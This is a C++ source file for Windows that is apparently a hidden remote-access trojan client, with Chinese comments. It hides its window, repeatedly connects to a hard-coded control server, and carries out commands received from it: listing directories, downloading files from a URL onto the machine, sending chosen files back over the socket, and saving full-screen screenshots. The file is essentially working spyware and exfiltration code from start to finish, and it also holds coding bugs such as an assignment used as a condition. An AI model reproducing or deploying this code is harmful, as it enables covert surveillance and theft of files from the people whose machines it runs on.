#include<stdio.h>
#include<iostream>
#include<cstring>
#include<string>
#include <tchar.h>
#include <io.h>
#include <sstream>
#include <afxwin.h>
#include <windows.h>
#include <cstring>
#include <fstream>
#include <winsock2.h>
#include <Urlmon.h>
using namespace std;
#pragma comment(lib,"ws2_32.lib")//windowssock库
#pragma comment(lib,"Urlmon.lib") //加入文件传输库
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // 这就是最重要的一个隐藏程序的代码
//TCP客户端
#define _CRT_SECURE_NO_WARNINGS
void SendFile(SOCKET sclient, string srcFileName);
LPCWSTR stringToLPCWSTR(std::string orig);
void download(string dourl, string a);
string dir(string path);
string deal(string things);
int connect();
void Screen(char filename[]);

int main()
{
	int temp = 10;
	while (true)
	{
		if (temp = 10)
		{
			temp = connect();
		}
		else
		{
			break;
		}
	}
	return 0;
}


void SendFile(SOCKET sclient, string srcFileName)
{
	int haveSend = 0;
	const int bufferSize = 1024;
	char buffer[bufferSize] = { 0 };
	int readLen = 0;
	//string srcFileName ;  //这是用户端要发送的路径
	ifstream srcFile;
	srcFile.open(srcFileName.c_str(), ios::binary);
	if (!srcFile){
		return;
	}
	while (!srcFile.eof()){
		srcFile.read(buffer, bufferSize);
		readLen = srcFile.gcount();
		send(sclient, buffer, readLen, 0);
		haveSend += readLen;
	}
	srcFile.close();
	cout << "send: " << haveSend << "B" << endl;
}

LPCWSTR stringToLPCWSTR(std::string orig)
{
	size_t origsize = orig.length() + 1;
	const size_t newsize = 100;
	size_t convertedChars = 0;
	wchar_t *wcstring = (wchar_t *)malloc(sizeof(wchar_t)*(orig.length() - 1));
	mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);
	return wcstring;
}

void download(string dourl, string a)
{
	LPCWSTR url = stringToLPCWSTR(dourl);
	printf("downurl: %S\n", url);
	TCHAR path[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, path);
	LPCWSTR savepath = stringToLPCWSTR(a);
	wsprintf(path, savepath, path);
	printf("savepath: %S\n", path);
	HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);
	if (res == S_OK)
	{
		printf("downover\n");
	}
	else if (res == E_OUTOFMEMORY)
	{
		printf("recvlength has something wrong or dont set recvlength\n");
	}
	else if (res == INET_E_DOWNLOAD_FAILURE)
	{
		printf("url has something wrong\n");
	}
	else
	{
		printf("unkonwn error\n", res);
	}
}

string dir(string path)
{
	string result;
	long hFile = 0;
	struct _finddata_t fileInfo;
	string pathName, exdName;
	//    \\* 代表要遍历所有的类型,如改成\\*.jpg表示遍历jpg类型文件
	if ((hFile = _findfirst(pathName.assign(path).append("\\*").c_str(), &fileInfo)) == -1)
	{
	}
	do
	{
		result = result + "\n" + fileInfo.name;
	} while (_findnext(hFile, &fileInfo) == 0);
	_findclose(hFile);
	return result;
}

string deal(string things)
{
	//分析命令
	if (things.find("dir") != string::npos)/*     dir-D:\\    */
	{
		string result = things.substr(things.find_first_of("-") + 1);
		string temp = dir(result);
		cout << temp << endl;
		return temp;
	}
	else if (things.find("down") != string::npos)//down-http://www.anyeur.club-D:index.php
	{
		string downurl = things.substr(things.find_first_of("-") + 1, things.find_last_of("-") - things.find_first_of("-") - 1);
		string savepath = things.substr(things.find_last_of("-") + 1);
		download(downurl, savepath);
		return "download over!";
	}
	else if (things.find("pass") != string::npos)//pass-D:\\001.txt-D:\\002.txt
	{
		string sendfile = things.substr(things.find_first_of("-") + 1, things.find_last_of("-") - things.find_first_of("-") - 1);
		return "pass-" + sendfile;
	}
	else if (things.find("screen") != string::npos)//screen-D:\\001.jpg
	{
		string savepat = things.substr(things.find_last_of("-") + 1);
		char savepath[20];
		strcpy(savepath, savepat.c_str());
		Screen(savepath);
		return "screen over!";
	}
	else
	{
		return "nothing";
	}
}

int connect()
{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		printf("initialization failed!\n");
		return 10;
	}
	while (true)
	{
		SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sclient == INVALID_SOCKET)
		{
			printf("invalid socket!\n");
			return 10;
		}
		sockaddr_in serAddr; //要连接的服务器端 的 端点地址
		serAddr.sin_family = AF_INET;
		serAddr.sin_port = htons(8888);
		serAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); //将ip变为地址结构
		//客户端程序不需要bind本机端点地址,系统会自动完成 

		if (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{
			printf("connect error!\n");
			closesocket(sclient);
			return 10;
		}
		char recData[1024];
		string a;
		int ret = recv(sclient, recData, 1024, 0);
		if (ret>0)
		{
			recData[ret] = 0x00;
			cout << "command：" << recData << endl;
			string CMD(recData);
			a = deal(CMD);
		}
		if (a.find("pass") != string::npos)
		{
			string sendfile = a.substr(a.find_last_of("-") + 1);
			SendFile(sclient, sendfile);
			closesocket(sclient);
		}
		else
		{
			string data;
			data = a;
			const char* sendData;
			sendData = data.c_str(); //string21变为const char*
			cout << strlen(sendData) << endl;
			send(sclient, sendData, strlen(sendData), 0);
			closesocket(sclient);
		}
	}
	WSACleanup();
}

void Screen(char filename[])
{
	CDC *pDC;//屏幕DC
	pDC = CDC::FromHandle(GetDC(NULL));//获取当前整个屏幕DC
	int BitPerPixel = pDC->GetDeviceCaps(BITSPIXEL);//获得颜色模式
	int Width = pDC->GetDeviceCaps(HORZRES);
	int Height = pDC->GetDeviceCaps(VERTRES);
	printf("当前屏幕色彩模式为%d位色彩\n", BitPerPixel);
	printf("屏幕宽度：%d\n", Width);
	printf("屏幕高度：%d\n", Height);
	CDC memDC;//内存DC
	memDC.CreateCompatibleDC(pDC);
	CBitmap memBitmap, *oldmemBitmap;//建立和屏幕兼容的bitmap
	memBitmap.CreateCompatibleBitmap(pDC, Width, Height);
	oldmemBitmap = memDC.SelectObject(&memBitmap);//将memBitmap选入内存DC
	memDC.BitBlt(0, 0, Width, Height, pDC, 0, 0, SRCCOPY);//复制屏幕图像到内存DC
	//以下代码保存memDC中的位图到文件
	BITMAP bmp;
	memBitmap.GetBitmap(&bmp);//获得位图信息
	FILE *fp = fopen(filename, "w+b");
	BITMAPINFOHEADER bih = { 0 };//位图信息头
	bih.biBitCount = bmp.bmBitsPixel;//每个像素字节大小
	bih.biCompression = BI_RGB;
	bih.biHeight = bmp.bmHeight;//高度
	bih.biPlanes = 1;
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biSizeImage = bmp.bmWidthBytes * bmp.bmHeight;//图像数据大小
	bih.biWidth = bmp.bmWidth;//宽度
	BITMAPFILEHEADER bfh = { 0 };//位图文件头
	bfh.bfOffBits = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);//到位图数据的偏移量
	bfh.bfSize = bfh.bfOffBits + bmp.bmWidthBytes * bmp.bmHeight;//文件总的大小
	bfh.bfType = (WORD)0x4d42;
	fwrite(&bfh, 1, sizeof(BITMAPFILEHEADER), fp);//写入位图文件头
	fwrite(&bih, 1, sizeof(BITMAPINFOHEADER), fp);//写入位图信息头
	byte * p = new byte[bmp.bmWidthBytes * bmp.bmHeight];//申请内存保存位图数据
	GetDIBits(memDC.m_hDC, (HBITMAP)memBitmap.m_hObject, 0, Height, p,
		(LPBITMAPINFO)&bih, DIB_RGB_COLORS);//获取位图数据
	fwrite(p, 1, bmp.bmWidthBytes * bmp.bmHeight, fp);//写入位图数据
	delete[] p;
	fclose(fp);
	memDC.SelectObject(oldmemBitmap);
}